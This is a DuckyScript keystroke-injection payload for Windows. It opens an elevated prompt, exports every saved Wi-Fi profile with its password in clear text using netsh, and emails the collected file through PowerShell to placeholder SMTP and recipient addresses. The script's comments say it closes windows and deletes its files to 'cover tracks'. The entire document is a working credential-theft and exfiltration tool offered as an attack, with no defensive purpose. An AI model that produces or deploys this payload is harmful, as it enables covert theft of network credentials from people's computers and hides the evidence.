REM The following script will allow us to obtain network names and wifi passwords and export them via email
DELAY 5000
CONTROL ESCAPE
DELAY 100
STRING CMD
DELAY 100
CTRL-SHIFT ENTER
DELAY 100
LEFTARROW
DELAY 100
ENTER
DELAY 200
STRING cd/
DELAY 300
ENTER
DELAY 100
REM make a directory to export the network profiles to
STRING mkdir wifi
DELAY 100
ENTER
DELAY 100
STRING cd wifi
DELAY 100
ENTER
DELAY 100
REM this command will export the profiles with the passwords in clear text
REM each profile will be exported to a seperate .xml file, the files will be concatanated later in script
STRING netsh wlan export profile key=clear
DELAY 200
ENTER
DELAY 100
REM this command will copy all the .xml files to one .txt file that we can export
STRING copy *.xml wifi.txt
DELAY 200
ENTER
DELAY 500
STRING exit
DELAY 100
ENTER
DELAY 500
REM exit out of administrative command prompt to cover tracks
CONTROL ESCAPE
DELAY 100
REM opens powershell for use of command line emailing
STRING Powershell
DELAY 100
ENTER
DELAY 100
REM setting variables for the email and sending the email with the attachment
DELAY 100
STRING $SmtpUser = "exmaple@example.com";
DELAY 100
STRING $smtpPassword = "stmp account password";
DELAY 100
STRING $SMTPServer = "smtp.example.com";
DELAY 100
STRING $SMTPPort = "587";
DELAY 100
STRING $PSEmailServer = $SMTPServer;
DELAY 100
STRING $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force);
DELAY 100
STRING $Body = "This is just a Test Body";
DELAY 100
STRING $Subject = "Test Email Subject";
DELAY 100
STRING $From = "example@example.com";
DELAY 100
STRING $To = "receiving_email@example.com";
DELAY 100
REM adding the attachment by providing full path to concatanated list of wifi networks and passwords
STRING $Attachment = "C:\wifi\wifi.txt";
DELAY 200
STRING Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment -UseSsl -Port 587 -Credential $Credentials;
DELAY 200
ENTER
DELAY 200
STRING exit
DELAY 100
ENTER
DELAY 300
REM exit out of powershell to cover tracks
CONTROL ESCAPE
DELAY 150
STRING CMD
DELAY 100
CTRL-SHIFT ENTER
DELAY 100
LEFTARROW
DELAY 100
ENTER
DELAY 200
STRING cd/
DELAY 300
ENTER
DELAY 100
REM delete the document we created
STRING del wifi
DELAY 150
ENTER
DELAY 100
STRING y
DELAY 100
ENTER
DELAY 100
STRING rmdir wifi
DELAY 100
ENTER
DELAY 100
STRING exit
DELAY 100
ENTER
